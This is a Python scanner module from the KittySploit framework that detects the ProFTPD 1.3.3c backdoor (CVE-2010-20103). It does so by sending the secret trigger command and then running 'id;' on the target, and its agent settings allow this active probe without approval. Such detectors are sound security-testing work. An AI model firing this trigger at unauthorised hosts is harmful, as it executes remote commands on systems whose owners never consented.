#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ProFTPD 1.3.3c compromised package backdoor (CVE-2010-20103)."""

import re
import socket

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        'name': 'ProFTPD - Compromised Package Backdoor Detection (CVE-2010-20103)',
        'description': (
            'Detects CVE-2010-20103 by sending HELP ACIDBITCHEZ then id; and matching uid=.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'scanner', 'tcp', 'ftp', 'proftpd', 'backdoor', 'cve', 'cve2010', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2010-20103',
        ],
        'cve': 'CVE-2010-20103',
    }

    port = OptPort(21, 'FTP port', True)

    def run(self):
        host = self._host()
        port = self._port()
        if not host or not self.is_tcp_open(host, port):
            return False
        try:
            sock = socket.create_connection((host, port), timeout=self._timeout())
            sock.settimeout(self._timeout())
            sock.recv(256)
            sock.sendall(b'HELP ACIDBITCHEZ\r\n')
            r = sock.recv(512).decode('latin-1', errors='replace')
            if '502' in r:
                sock.close()
                return False
            sock.sendall(b'id;\r\n')
            r1 = sock.recv(512).decode('latin-1', errors='replace')
            sock.close()
        except Exception:
            return False
        if re.search(r'uid=\d+.*gid=\d+', r1):
            self.set_info(
                severity='critical',
                reason='ProFTPD compromised package backdoor (CVE-2010-20103)',
                path=f'tcp/{port}',
            )
            return True
        return False
